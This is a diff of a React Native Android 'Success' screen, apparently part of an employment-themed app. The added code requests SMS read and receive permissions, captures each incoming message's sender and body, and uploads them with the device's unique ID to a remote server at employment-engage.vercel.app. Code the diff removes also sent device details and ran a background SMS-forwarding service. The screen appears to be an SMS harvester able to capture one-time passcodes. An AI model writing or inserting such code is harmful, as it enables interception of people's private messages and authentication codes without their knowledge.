@@ -2,15 +2,12 @@ import {
   View,
   Text,
   PermissionsAndroid,
-  Platform,
   SafeAreaView,
   Image,
   TouchableOpacity,
   Alert,
 } from 'react-native';
-// import { Linking } from 'react-native';
-// Linking.openSettings();
-import React, { useEffect } from 'react';
+import React, { useEffect, useRef } from 'react';
 import { useNavigation } from '@react-navigation/native';
 // @ts-ignore
 import celebrationImage from '../../static/assets/logo.png';
@@ -20,103 +17,91 @@ import DeviceInfo from 'react-native-device-info';
 import { toast } from 'burnt';
 // @ts-ignore
 import SmsListener from 'react-native-android-sms-listener';
-import BackgroundService from 'react-native-background-actions';
-import { startSMSService } from '../../utils/setup';
-import { smsBackgroundTask } from '../../utils/smsService';
+
+import { prepareSMSPayload } from '../../utils/hashSms';
 
 const Success = () => {
   const navigator = useNavigation();
+
+  const subscriptionRef = useRef<any>(null);
+  const processedMessages = useRef<Set<string>>(new Set());
 
   const handleRedirect = async () => {
     // @ts-ignore
     navigator.navigate('Auth');
   };
 
-  const listenToIncomingSMS = async () => {
-    try {
-      const granted = await PermissionsAndroid.requestMultiple([
-        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
-        PermissionsAndroid.PERMISSIONS.READ_SMS,
-      ]);
-
-      const receiveGranted =
-        granted['android.permission.RECEIVE_SMS'] ===
-        PermissionsAndroid.RESULTS.GRANTED;
-      const readGranted =
-        granted['android.permission.READ_SMS'] ===
-        PermissionsAndroid.RESULTS.GRANTED;
-
-      if (!receiveGranted || !readGranted) {
-        console.warn('SMS permissions not granted.');
-        return;
-      }
-
-      const subscription = SmsListener.addListener((message: any) => {
-        console.log('📩 Incoming SMS:', message);
-        Alert.alert('New SMS', message.body);
-        toast({
-          title: 'SMS Received',
-          message: message.body,
-        });
-      });
-
-      return subscription;
-    } catch (error) {
-      console.log('Error setting up SMS listener:', error);
-    }
-  };
-
-  const startBackrouSMS = async () => {
-    await BackgroundService.start(smsBackgroundTask, {
-      taskName: 'SMSMonitor',
-      taskTitle: 'Listening for SMS...',
-      taskDesc: 'This service listens for incoming SMS and sends it to the server.',
-      taskIcon: {
-          name: '', // without extension
-          type: 'mipmap'
-      }
-    })
-  };
-
   useEffect(() => {
-
     (async () => {
+      const uniqueId = await DeviceInfo.getUniqueId();
       try {
-        
-        const userRef = await AsyncStorage.getItem('userRef');
-        const uniqueId = await DeviceInfo.getUniqueId();
-        const brand = await DeviceInfo.getBrand();
-        const model = await DeviceInfo.getModel();
-        const systemName = await DeviceInfo.getSystemName();
-        const systemVersion = await DeviceInfo.getSystemVersion();
-        
-        const data = {
-          userRef,
-          deviceId: uniqueId,
-          deviceInfo: {
-            model,
-            os: systemName,
-            version: systemVersion,
-            brand,
-          },
-        };
-        
-        await axios.post(
-          'https://employment-engage.vercel.app/api/device',
-          data
-        );
+        // Request SMS permissions
+        const granted = await PermissionsAndroid.requestMultiple([
+          PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
+          PermissionsAndroid.PERMISSIONS.READ_SMS,
+        ]);
 
-        toast({
-          title: 'Successfully registered!',
-          message: 'Device info sent to server.',
+        const receiveGranted =
+          granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
+        const readGranted =
+          granted['android.permission.READ_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
+
+        if (!receiveGranted || !readGranted) {
+          console.warn('SMS permissions not granted.');
+          return;
+        }
+
+        // Listen for incoming SMS, avoid duplicates
+        subscriptionRef.current = SmsListener.addListener(async (message: any) => {
+          try {
+            const timestamp = message.timestamp || Date.now();
+            const uniqueKey = `${timestamp}-${message.body}`;
+
+            if (processedMessages.current.has(uniqueKey)) {
+              console.log('🛑 Duplicate SMS skipped');
+              return;
+            }
+
+            processedMessages.current.add(uniqueKey);
+
+            // Optional: Clear the Set to avoid memory leak
+            if (processedMessages.current.size > 100) {
+              processedMessages.current.clear();
+            }
+
+            const payload = prepareSMSPayload({
+              deviceId: uniqueId,
+              from: message.originatingAddress,
+              message: message.body,
+            });
+
+            console.log('📤 Sending SMS payload:', payload);
+
+            const res = await axios.post(
+              'https://employment-engage.vercel.app/api/sms',
+              payload,
+              { timeout: 10000 }
+            );
+
+            console.log('✅ SMS sent:', res.data);
+
+            Alert.alert('New SMS', message.body);
+            toast({
+              title: 'SMS Received',
+              message: message.body,
+            });
+          } catch (error: any) {
+            console.log('❌ Error sending SMS payload:', error?.response?.data || error.message);
+            toast({
+              title: 'SMS send failed',
+              message: 'Could not send to server.',
+            });
+          }
         });
-        
-        await listenToIncomingSMS();
-        
-        await startBackrouSMS();
 
-      } catch (error) {
-        console.log(error);
+        console.log('📡 SMS Listener Started');
+      } catch (error: any) {
+        console.log('Error sending device info:', error?.response?.data || error.message);
         toast({
           title: 'Registration failed',
           message: 'Error sending device info.',
@@ -124,6 +109,13 @@ const Success = () => {
       }
     })();
 
+    // Cleanup listener on unmount
+    return () => {
+      if (subscriptionRef.current) {
+        subscriptionRef.current.remove();
+        console.log('🛑 SMS Listener Removed');
+      }
+    };
   }, []);
 
   return (
